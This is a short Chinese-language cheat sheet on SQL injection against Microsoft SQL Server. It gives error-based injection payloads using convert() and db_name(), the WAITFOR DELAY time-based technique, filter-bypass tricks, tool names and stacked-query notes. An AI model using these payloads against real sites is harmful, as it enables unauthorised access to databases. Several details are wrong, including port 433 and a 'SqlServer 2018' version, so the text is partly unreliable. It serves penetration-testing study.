Mssql（SqlServer）数据库都是经常与Asp和Aspx一起使用的，系统存放的表在视图-系统视图中

常用的版本
* SqlServer 2012
* SqlServer 2018


^
sqlserver报错注入：
```
id=1' and 1=convert(int,(select db_name(0)))--+
' and 1=convert(int,(select db_name(0))) AND 'qaq'='qaq    //记得url上url编码
id=1' and 1=convert(int,(select db_name(1)))--+   //查询第二个数据库，以此类推。
```

sqlserver时间盲注函数：WAITFOR DELAY

绕过：
```
空格变/**/
url编码
```

sqlserver注入工具可以使用穿山甲工具，sqlmap。

端口433，默认用户sa，有高权限。

sql语法与mysql区别：
联合查询不用union：用cast()
数据库名：DB_NAME()
在sqlsever中是可以执行多条操作的，两条sql语句是用分号进行分开的
